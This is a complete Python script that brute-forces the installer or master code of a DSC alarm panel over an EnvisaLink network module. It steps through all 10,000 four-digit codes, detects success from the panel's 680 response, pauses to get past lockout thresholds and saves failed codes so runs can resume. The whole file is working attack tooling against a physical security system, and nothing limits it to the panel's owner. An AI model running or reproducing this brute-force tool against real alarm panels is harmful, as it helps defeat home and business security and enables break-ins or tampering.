#!/usr/bin/env python3
"""Brute-force master code finder for DSC alarm systems via EnvisaLink.

Iterates through all 4-digit codes (0000-9999), testing each against the DSC
panel by entering installer mode (*8) and checking for a success response (680).
Previously failed codes are persisted to a file so runs can be resumed.
"""

from __future__ import annotations

import argparse
import contextlib
import logging
import os
import re
import socket
import sys
import time

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------


def send_raw(sock: socket.socket, cmd: str, data: str = "") -> None:
    """Send an EnvisaLink TPI command with a 2-hex-char checksum + CRLF."""
    checksum = sum(ord(c) for c in (cmd + data)) & 0xFF
    full_msg = (cmd + data + f"{checksum:02X}" + "\r\n").encode("ascii")
    sock.send(full_msg)
    log.debug("  [sent: %s]", " ".join(f"{b:02x}" for b in full_msg))


def recv_simple(sock: socket.socket, timeout: float = 1.5) -> str:
    """Receive up to 64 bytes, returning only printable ASCII characters."""
    sock.settimeout(timeout)
    try:
        data = sock.recv(64)
        return "".join(chr(b) for b in data if 32 <= b <= 126)
    except TimeoutError:
        return ""
    except OSError as exc:
        log.warning("recv_simple error: %s", exc)
        raise


def recv_with_timeout(
    sock: socket.socket,
    target: str | None = None,
    timeout: float = 2.0,
) -> str:
    """Receive data, optionally waiting for a regex *target* pattern."""
    sock.settimeout(0.2)
    start = time.time()
    responses: list[str] = []
    raw_chunks: list[bytes] = []

    while time.time() - start < timeout:
        try:
            data = sock.recv(64)
            if data:
                raw_chunks.append(data)
                response = "".join(chr(b) for b in data if 32 <= b <= 126)
                responses.append(response)
                if target and re.search(target, response):
                    return response
        except TimeoutError:
            pass
        except OSError as exc:
            log.warning("recv_with_timeout error: %s", exc)
            break

    result = "".join(responses) if responses else ""
    if not result and raw_chunks:
        hex_data = " ".join(f"{b:02x}" for chunk in raw_chunks for b in chunk)
        log.debug("  [raw: %s]", hex_data)
    return result


# ---------------------------------------------------------------------------
# Fail-file persistence
# ---------------------------------------------------------------------------


def load_failed_codes(fail_file: str) -> set[str]:
    """Load previously failed codes from *fail_file*."""
    if not os.path.exists(fail_file):
        return set()

    log.info("Loading %s ...", fail_file)
    with open(fail_file) as fh:
        failed = {line.strip() for line in fh if line.strip()}
    log.info("Loaded %d previously failed codes", len(failed))
    return failed


def verify_file_writable(fail_file: str) -> bool:
    """Return ``True`` if *fail_file* can be opened for appending."""
    try:
        with open(fail_file, "a"):
            pass
        return True
    except OSError as exc:
        print(f"Error: cannot write to {fail_file}: {exc}", file=sys.stderr)
        return False


def save_failed_code(fail_file: str, code: str) -> None:
    """Append a failed *code* to *fail_file*."""
    with open(fail_file, "a") as fh:
        fh.write(code + "\n")
    log.info("Logged %s to %s", code, fail_file)


# ---------------------------------------------------------------------------
# Code testing
# ---------------------------------------------------------------------------


def test_code(
    sock: socket.socket,
    code: str,
    test_num: int,
    partition: str,
) -> bool:
    """Send *code* to the panel and return ``True`` if it is accepted."""
    print(f"[{test_num:4d}] {code} ", end="", flush=True)

    # Enter installer mode: *8
    send_raw(sock, "071", f"{partition}*8")
    time.sleep(1.0)

    resp = recv_with_timeout(sock, target="922", timeout=3.0)
    if not resp or "922" not in resp:
        print(f'? (no 922, got: "{resp}")')
        raise RuntimeError(f'Failed to enter installer mode - no 922 response (got: "{resp}")')

    # Send candidate code
    send_raw(sock, "200", code)
    time.sleep(0.5)

    resp = recv_with_timeout(sock, target="6[5678]|922", timeout=2.0)

    found = bool(resp and "680" in resp)

    # Back out to the main menu regardless of result
    send_raw(sock, "071", f"{partition}##")
    time.sleep(0.6)
    recv_with_timeout(sock, timeout=1.0)

    print("FOUND!" if found else "x")
    return found


# ---------------------------------------------------------------------------
# Connection management
# ---------------------------------------------------------------------------


def connect_fresh(host: str, port: int, password: str) -> socket.socket:
    """Open a new TCP connection to the EnvisaLink and authenticate."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    try:
        sock.recv(64)
    except TimeoutError:
        pass
    except OSError as exc:
        log.warning("Initial recv warning: %s", exc)

    send_raw(sock, "005", password)
    time.sleep(1.5)
    resp = recv_simple(sock)
    if "505" not in resp:
        raise RuntimeError("Login failed")

    log.info("Connected to %s:%d", host, port)
    return sock


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------


def run(args: argparse.Namespace, sock: socket.socket | None) -> None:
    """Execute the brute-force search loop."""
    print("DSC master-code finder (resumable)")
    print(f"Fail log : {args.fail_file}")
    print(f"Target   : {args.host}:{args.port}")
    print()

    if not verify_file_writable(args.fail_file):
        sys.exit(1)

    failed_codes = load_failed_codes(args.fail_file)

    test_num = -1
    fails = 0
    retry_count = 0
    interrupted = False

    while test_num <= 9999:
        test_num += 1
        code = f"{test_num:04d}"
        try:
            if code in failed_codes:
                log.debug("Skipping %s (known fail)", code)
                continue

            if sock is None:
                sock = connect_fresh(args.host, args.port, args.password)

            if test_code(sock, code, test_num, args.partition):
                print(f"\nMASTER CODE: {code}")
                print("Verify on keypad!")                
                return

            retry_count = 0

            save_failed_code(args.fail_file, code)
            failed_codes.add(code)

            fails += 1
            if fails >= args.max_attempts:
                print(f"Lockout threshold ({args.max_attempts}) - waiting 90 s")
                time.sleep(90)
                fails = 0

            time.sleep(3)

        except KeyboardInterrupt:
            print(f"\nStopped at code {code}")
            interrupted = True

        except Exception as exc:
            print(f"Error: {exc}")
            if sock:
                with contextlib.suppress(OSError):
                    sock.close()
            sock = None
            retry_count += 1

            if retry_count >= args.max_retries:
                print(f"Giving up on code {code} after {args.max_retries} retries")
                save_failed_code(args.fail_file, code)
                failed_codes.add(code)
                retry_count = 0
            else:
                test_num -= 1

            time.sleep(5)
            sock = connect_fresh(args.host, args.port, args.password)

    if not interrupted:
        print("\nAll 10000 codes exhausted without finding master code")
    print(f"{len(failed_codes)} codes logged in {args.fail_file}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Brute-force master code finder for DSC alarm panels via EnvisaLink.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--host",
        default="192.168.1.3",
        help="EnvisaLink IP address",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4025,
        help="EnvisaLink TCP port",
    )
    parser.add_argument(
        "--password",
        default="user",
        help="EnvisaLink login password",
    )
    parser.add_argument(
        "--partition",
        default="1",
        help="DSC partition number",
    )
    parser.add_argument(
        "--max-attempts",
        type=int,
        default=2,
        help="Number of codes to try before doing a lockout pause",
    )
    parser.add_argument(
        "--max-retries",
        type=int,
        default=3,
        help="Max retries per code on connection errors",
    )
    parser.add_argument(
        "--fail-file",
        default="fail.txt",
        help="File for persisting failed codes",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        default=False,
        help="Enable verbose debug output",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    """Entry point."""
    args = parse_args(argv)

    logging.basicConfig(
        format="%(message)s",
        level=logging.DEBUG if args.debug else logging.WARNING,
    )

    sock: socket.socket | None = None
    run(args, sock)
    if sock:
        sock.close()


if __name__ == "__main__":
    main()
